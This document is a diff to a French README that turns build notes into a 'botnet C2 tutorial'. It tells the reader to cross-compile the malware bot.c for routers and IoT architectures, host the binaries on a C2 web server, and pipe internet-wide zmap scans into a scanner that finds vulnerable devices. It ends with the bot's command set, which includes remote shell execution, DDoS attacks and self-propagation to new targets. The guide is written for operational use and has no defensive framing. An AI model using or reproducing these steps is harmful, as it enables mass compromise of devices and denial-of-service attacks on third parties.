@@ -1,13 +1,95 @@
 CHANGE IP IN fiber.go
 
-# Pour Kali Linux
-sudo apt update
-sudo apt install golang -y
-sudo apt install zmap -y
-go build fiber.go
+# TUTORIEL BOTNET C2
 
-# Exécuter avec sudo pour avoir les permissions nécessaires
+## 1. Configuration du scanner (fiber.go)
+
+1. Changer l'adresse IP dans fiber.go pour qu'elle corresponde à votre serveur C2
+2. Installer les dépendances : sudo apt install golang zmap
+3. Compiler : go build fiber.go
+
+## 2. Compilation du malware (bot.c) pour différentes architectures
+
+### Installation des cross-compilateurs
+```
+sudo apt update
+sudo apt install -y gcc-mips-linux-gnu gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu
+sudo apt install -y gcc-powerpc-linux-gnu gcc-sh4-linux-gnu gcc-m68k-linux-gnu
+sudo apt install -y gcc-sparc64-linux-gnu
+```
+
+### Compilation pour différentes architectures
+```
+# MIPS (routeurs courants)
+mips-linux-gnu-gcc -static -o bot.mips bot.c
+
+# ARM (IoT, routeurs)
+arm-linux-gnueabi-gcc -static -o bot.arm bot.c
+
+# ARM64 (appareils modernes)
+aarch64-linux-gnu-gcc -static -o bot.arm7 bot.c
+
+# x86 (ordinateurs 32-bit)
+gcc -m32 -static -o bot.x86 bot.c
+
+# x86_64 (ordinateurs 64-bit)
+gcc -static -o bot.x86_64 bot.c
+
+# PowerPC
+powerpc-linux-gnu-gcc -static -o bot.ppc bot.c
+
+# SH4 (anciens appareils embarqués)
+sh4-linux-gnu-gcc -static -o bot.sh4 bot.c
+
+# M68K (anciens systèmes)
+m68k-linux-gnu-gcc -static -o bot.m68k bot.c
+
+# SPARC (serveurs)
+sparc64-linux-gnu-gcc -static -o bot.sparc bot.c
+```
+
+## 3. Configuration du serveur C2
+
+1. Démarrer le serveur C2 : python simple_c2.py
+2. Placer tous les binaires compilés dans le répertoire racine du serveur web
+3. Assurez-vous que le serveur web est configuré pour servir les fichiers binaires
+
+## 4. Lancement du scanner
+
+### Utilisation du fichier all.lst (recommandé)
+
+Le fichier all.lst contient des plages d'adresses IP spécifiques où vous êtes plus susceptible de trouver des appareils vulnérables.
+
+```
+# Scanner uniquement les plages d'adresses IP spécifiées dans all.lst
 sudo bash -c "ulimit -n 999999; ulimit -u999999; zmap -p80 -w all.lst -q | ./fiber 80"
+
+# Si vous avez des problèmes avec zmap, spécifiez l'interface réseau
+sudo bash -c "ulimit -n 999999; ulimit -u999999; zmap -p80 -w all.lst -q -i eth0 | ./fiber 80"
+# Remplacez eth0 par votre interface réseau (eth0, wlan0, etc.)
+```
+
+### Scan générique (alternative)
+
+Si vous préférez scanner des adresses IP aléatoires :
+
+```
+# Générer une liste d'adresses IP cibles
+sudo zmap -p 80 -o ips.txt -n 100000
+
+# Lancer le scanner
+cat ips.txt | ./fiber 80
+```
+
+## 5. Commandes du serveur C2
+
+Une fois que les bots sont connectés, vous pouvez envoyer les commandes suivantes :
+- PING : Vérifier si le bot est actif
+- EXEC <commande> : Exécuter une commande shell
+- SCAN <sous-réseau> : Scanner un sous-réseau (ex: SCAN 192.168.1)
+- DDOS <cible>:<port> <durée> : Lancer une attaque DDoS
+- PROPAGATE <cible> : Propager le bot à une nouvelle cible
+- EXIT : Fermer la connexion avec le bot
 
 # Si vous avez toujours des problèmes avec zmap, essayez de spécifier l'interface
 # sudo bash -c "ulimit -n 999999; ulimit -u999999; zmap -p80 -w all.lst -q -i wlan0 | ./fiber 80"
